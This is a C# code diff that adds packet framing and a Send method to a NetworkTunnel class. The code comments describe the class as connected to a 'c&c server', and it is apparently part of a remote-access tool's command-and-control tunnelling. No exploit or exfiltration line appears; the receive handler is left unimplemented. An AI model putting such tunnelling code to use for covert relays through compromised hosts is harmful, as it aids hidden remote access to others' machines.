@@ -11,7 +11,7 @@ namespace xServer.Core.Networking
     public class NetworkTunnel
     {
         /// <summary>
-        /// This is the main socket and should be connected to the c&c server
+        /// This is the main socket, it should be connected to the c&c server
         /// </summary>
         Socket _handle;
         byte[] _readBuffer;
@@ -99,14 +99,18 @@ namespace xServer.Core.Networking
 
 
         /// <summary>
-        /// Reads incomming data and determines the type of each packet:
-        /// TCP_SYN, TCP_PSH or TCP_FIN
-        /// also performs the required actions to each type of packet
+        /// Collects incomming data and creates the corresponding TunnelPackets instances
         /// </summary>
         /// <param name="result"></param>
         public void AsyncReceive(IAsyncResult result)
         {
             /* To be implemented */
+        }
+
+        public void Send(TunnelSocket socket, byte[] packet)
+        {
+            TunnelPacket tp = new TunnelPacket((IPEndPoint)socket.RemoteEndPoint, TunnelPacket.TCP_PSH, packet);
+            _handle.Send(tp.Build());
         }
 
         public void Disconnect()
@@ -121,5 +125,95 @@ namespace xServer.Core.Networking
             }
         }
 
+        /// <summary>
+        /// A TunnelPacket is built with the following format:
+        /// [4 bytes for the origin IP Address]
+        /// [2 bytes for the origin port (big endian)]
+        /// [1 byte for the packet type]
+        /// [2 bytes for the payload length (big endian)]
+        /// [ the payload ]
+        /// </summary>
+        private class TunnelPacket
+        {
+            public const byte TCP_SYN = 0;
+            public const byte TCP_PSH = 1;
+            public const byte TCP_FIN = 2;
+            private byte _type;
+            private IPEndPoint _ipep;
+            private byte[] _payload;
+            private ushort _length;
+
+            public byte Type { get { return _type; } }
+            public IPEndPoint RemoteEndPoint { get { return _ipep; } }
+            public byte[] Payload { get { return _payload; } }
+
+            /// <summary>
+            /// Parses a packet/buffer to create a new TunnelPacket
+            /// </summary>
+            /// <param name="packet"> the buffer to be parsed </param>
+            public TunnelPacket(byte[] packet)
+            {
+                byte[] tmp = new byte[4];
+                Array.Copy(packet, 0, tmp, 0, 4);
+                IPAddress address = new IPAddress(tmp);
+                tmp = new byte[2];
+                Array.Copy(packet, 4, tmp, 0, 2);
+                if (BitConverter.IsLittleEndian)
+                {
+                    Array.Reverse(tmp);
+                }
+                ushort port = BitConverter.ToUInt16(tmp, 0);
+                _ipep = new IPEndPoint(address, port);
+                _type = packet[6];
+                Array.Copy(packet, 7, tmp, 0, 2);
+                if (BitConverter.IsLittleEndian)
+                {
+                    Array.Reverse(tmp);
+                }
+                _length = BitConverter.ToUInt16(tmp, 0);
+                _payload = new byte[_length];
+                Array.Copy(packet, 9, _payload, 0, _length);
+            }
+
+            /// <summary>
+            /// Creates a TunnelPacket that can be serialized using the Build() method
+            /// </summary>
+            /// <param name="ipep"></param>
+            /// <param name="type"></param>
+            /// <param name="payload"></param>
+            public TunnelPacket(IPEndPoint ipep, byte type, byte[] payload)
+            {
+                _type = type;
+                _ipep = ipep;
+                _payload = payload;
+                _length = (ushort)_payload.Length;
+            }
+
+            /// <summary>
+            /// Serializes this packet
+            /// </summary>
+            /// <returns> the byte array to be sent through the tunnel </returns>
+            public byte[] Build()
+            {
+                byte[] address = _ipep.Address.GetAddressBytes();
+                byte[] port = BitConverter.GetBytes((ushort)_ipep.Port);
+                if (BitConverter.IsLittleEndian)
+                {
+                    Array.Reverse(port);
+                }
+                byte[] len = BitConverter.GetBytes(_length);
+                if (BitConverter.IsLittleEndian)
+                {
+                    Array.Reverse(len);
+                }
+                byte[] serialized = new byte[address.Length + port.Length + _payload.Length + 3];
+                Array.Copy(address, 0, serialized, 0, address.Length);
+                Array.Copy(port, 0, serialized, address.Length, port.Length);
+                serialized[address.Length + port.Length] = _type;
+                Array.Copy(len, 0, serialized, address.Length + port.Length + 1, 2);
+                Array.Copy(_payload, 0, serialized, address.Length + port.Length + 3, _length);
+                return serialized;
+            }
+        }
     }
 }
